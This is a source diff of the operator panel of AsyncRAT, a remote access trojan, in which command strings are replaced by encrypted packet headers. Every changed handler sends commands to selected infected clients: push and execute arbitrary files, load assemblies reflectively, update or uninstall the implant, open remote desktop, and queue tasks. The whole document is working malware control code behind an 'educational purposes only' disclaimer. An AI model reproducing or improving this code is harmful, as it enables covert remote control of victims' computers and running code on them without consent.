@@ -1,14 +1,15 @@
 ﻿Imports System.ComponentModel
 Imports System.IO
 
+
 '
 
 '       │ Author     : NYAN CAT
-'       │ Name       : AsyncRAT
+'       │ Name       : AsyncRAT // Simple Socket
 
 '       Contact Me   : https://github.com/NYAN-x-CAT
 
-'       This program is distributed for educational purposes only.
+'       This program Is distributed for educational purposes only.
 
 '
 
@@ -23,10 +24,12 @@ Public Class Form1
 
         Pending.Req_In = New List(Of Incoming_Requests)
         Dim Req_In As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.Incoming))
+        Req_In.IsBackground = False
         Req_In.Start()
 
         Pending.Req_Out = New List(Of Outcoming_Requests)
         Dim Req_Out As New Threading.Thread(New Threading.ThreadStart(AddressOf Pending.OutComing))
+        Req_Out.IsBackground = False
         Req_Out.Start()
 
         Try
@@ -49,6 +52,8 @@ Public Class Form1
             Else
                 Environment.Exit(0)
             End If
+
+            Try : LV1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize) : Catch : End Try
         Catch ex As Exception
             Debug.WriteLine("PORTS INTRO " + ex.Message)
         End Try
@@ -65,11 +70,9 @@ Public Class Form1
     Private Sub CLOSEToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CLOSEToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
-                Dim B As Byte() = SB("CLOSE")
-
                 For Each C As ListViewItem In LV1.SelectedItems
                     Dim CL As Client = CType(C.Tag, Client)
-                    Dim ClientReq As New Outcoming_Requests(CL, B)
+                    Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.ClientShutdown))
                     Pending.Req_Out.Add(ClientReq)
                 Next
             Catch ex As Exception
@@ -84,18 +87,16 @@ Public Class Form1
 
                 Dim o As New OpenFileDialog
                 With o
-                    .Filter = "(*.exe)|*.exe"
+                    .Filter = "(*.*)|*.*"
                     .Title = "Update Client"
                 End With
 
                 If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                    Dim B As Byte() = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
 
                     For Each C As ListViewItem In LV1.SelectedItems
                         Dim CL As Client = CType(C.Tag, Client)
-                        Dim ClientReq As New Outcoming_Requests(CL, B)
+                        Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.ClientUpdate), Path.GetExtension(o.FileName), AES_Encryptor(File.ReadAllBytes(o.FileName)), True)
                         Pending.Req_Out.Add(ClientReq)
-                        CL.L.ForeColor = Color.Red
                     Next
                 End If
             Catch ex As Exception
@@ -107,10 +108,9 @@ Public Class Form1
     Private Sub UNINSTALLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UNINSTALLToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
-                Dim B As Byte() = SB("DEL")
 
                 For Each C As ListViewItem In LV1.SelectedItems
-                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                    Dim ClientReq As New Outcoming_Requests(C.Tag, CByte(PacketHeader.ClientDelete))
                     Pending.Req_Out.Add(ClientReq)
                 Next
             Catch ex As Exception
@@ -130,13 +130,12 @@ Public Class Form1
                 End With
 
                 If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                    Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
 
                     For Each C As ListViewItem In LV1.SelectedItems
                         Dim CL As Client = CType(C.Tag, Client)
-                        Dim ClientReq As New Outcoming_Requests(CL, B)
+                        Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.ClientUpdate), Path.GetExtension(o.FileName), AES_Encryptor(File.ReadAllBytes(o.FileName)), False)
                         Pending.Req_Out.Add(ClientReq)
-                        CL.L.ForeColor = Color.Red
+                        CL.LV.ForeColor = Color.Red
                     Next
                 End If
             Catch ex As Exception
@@ -151,13 +150,12 @@ Public Class Form1
                 Dim LDR As New Loader
                 LDR.ShowDialog()
                 If LDR.isOK Then
-                    Dim B As Byte() = SB("REFLECTION" & Settings.SPL & StrReverse(Convert.ToBase64String(File.ReadAllBytes(LDR.o.FileName))))
 
                     For Each C As ListViewItem In LV1.SelectedItems
                         Dim CL As Client = CType(C.Tag, Client)
-                        Dim ClientReq As New Outcoming_Requests(CL, B)
+                        Dim ClientReq As New Outcoming_Requests(CL, CByte(PacketHeader.Reflection), AES_Encryptor(File.ReadAllBytes(LDR.o.FileName)))
                         Pending.Req_Out.Add(ClientReq)
-                        CL.L.ForeColor = Color.Red
+                        CL.LV.ForeColor = Color.Red
                     Next
                 End If
             Catch ex As Exception
@@ -170,10 +168,8 @@ Public Class Form1
         If LV1.SelectedItems.Count > 0 Then
             Try
 
-                Dim B As Byte() = SB("RD-")
-
                 For Each C As ListViewItem In LV1.SelectedItems
-                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                    Dim ClientReq As New Outcoming_Requests(C.Tag, CByte(PacketHeader.RemoteDesktopOpen))
                     Pending.Req_Out.Add(ClientReq)
                 Next
             Catch ex As Exception
@@ -184,8 +180,8 @@ Public Class Form1
 
     Private Sub Timer_Status_Tick(sender As Object, e As EventArgs) Handles Timer_Status.Tick
         Try
-            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]       Password [{3}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList),Settings.KEY)
-            Text = " AsyncRAT " + Settings.VER + " // " + DateTime.Now
+            ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]       Listening Ports [{2}]       Password [{3}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString, String.Join(",", Settings.Ports.ToList), Settings.KEY)
+            Text = Settings.VER + "  " + DateTime.Now
         Catch ex As Exception
             Debug.WriteLine("Timer_Status " + ex.Message)
         End Try
@@ -195,9 +191,8 @@ Public Class Form1
         If LV1.Items.Count > 0 Then
             Try
 
-                Dim B As Byte() = SB("PING!")
                 For Each C As ListViewItem In LV1.Items
-                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                    Dim ClientReq As New Outcoming_Requests(C.Tag, CByte(PacketHeader.Ping))
                     Pending.Req_Out.Add(ClientReq)
                 Next
             Catch ex As Exception
@@ -246,31 +241,29 @@ Public Class Form1
         Try
             Dim T As New TaskForm
             T.ShowDialog()
-            Dim TaskID As String = Guid.NewGuid.ToString
-            Dim B As Byte() = Nothing
+            Dim _TaskID As String = Guid.NewGuid.ToString
             If T.OK = True Then
-
-                If T._CMD = "UPDATE" Then
-                    B = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(T._FILE)))
-                ElseIf T._CMD = "DW" Then
-                    B = SB("DW" & Settings.SPL & Path.GetExtension(T._FILE) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(T._FILE)))
-                End If
 
                 Dim LV = LV3.Items.Insert(0, LV3.Items.Count + 1)
                 LV.SubItems.Add(T._CMD + " = " + Path.GetFileName(T._FILE))
                 LV.SubItems.Add(0)
-                LV.Tag = TaskID
+                LV.Tag = _TaskID
                 LV3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
 
-                Dim NewDoTask As New TaskList With {
-                    .Task = TaskID,
-                    .B = B,
-                    .F = Me
-                }
+                If T._CMD = "UPDATE" Then
+                    Dim ClientReq As New WorkTask(CByte(PacketHeader.ClientUpdate), AES_Encryptor(File.ReadAllBytes(T._FILE)), True) With {
+                        .F = Me,
+                        .TaskID = _TaskID
+                    }
+                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf ClientReq.Work))
 
-                'Dim _Thread As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf NewDoTask.Worker))
-                '  _Thread.Start()
-                Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf NewDoTask.Worker))
+                ElseIf T._CMD = "DW" Then
+                    Dim ClientReq As New WorkTask(CByte(PacketHeader.ClientUpdate), Path.GetExtension(T._FILE), AES_Encryptor(File.ReadAllBytes(T._FILE)), False) With {
+                            .F = Me,
+                            .TaskID = _TaskID}
+                    Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf ClientReq.Work))
+
+                End If
                 T.Close()
             End If
         Catch ex As Exception
